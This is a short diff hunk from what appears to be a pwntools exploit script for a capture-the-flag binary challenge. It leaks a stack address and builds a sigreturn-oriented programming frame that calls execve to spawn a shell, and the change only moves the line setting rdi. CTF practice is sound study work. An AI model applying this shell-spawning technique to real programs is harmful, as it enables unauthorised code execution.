@@ -15,8 +15,8 @@ stack = u64(p.recv()[0x20:0x20 + 8]) - 0x148 # 本地调试偏移为0x148, buu�
 #SROP
 frame = SigreturnFrame()
 frame.rax = constants.SYS_execve
-frame.rdi = stack
 frame.rip = syscall
+frame.rdi = stack
 frame.rsi = 0
 frame.rdx = 0
 
